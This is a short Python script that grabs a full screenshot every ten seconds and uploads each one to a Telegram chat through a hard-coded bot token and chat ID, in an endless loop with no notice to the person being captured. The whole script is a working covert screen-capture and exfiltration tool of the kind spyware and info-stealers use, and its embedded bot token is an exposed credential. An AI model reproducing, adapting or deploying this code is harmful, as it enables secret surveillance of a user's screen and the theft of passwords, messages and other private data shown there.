import time
import requests
from PIL import ImageGrab

# Set your Telegram Bot credentials
BOT_TOKEN = '8116516891:AAFVVQgD1UjPx85QxtNpCxVRgzDiNoGDa30'
CHAT_ID = '809367857'

def take_screenshot():
    # Take a screenshot
    screenshot = ImageGrab.grab()
    screenshot.save('screenshot.png')
    return 'screenshot.png'

def send_to_telegram(file_path):
    with open(file_path, 'rb') as file:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
        files = {'photo': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data)
        return response.json()

def main():
    while True:
        screenshot_path = take_screenshot()
        response = send_to_telegram(screenshot_path)
        print(response)  # Print the response from Telegram
        time.sleep(10)  # Wait for 10 seconds before taking the next screenshot

if __name__ == '__main__':
    main()
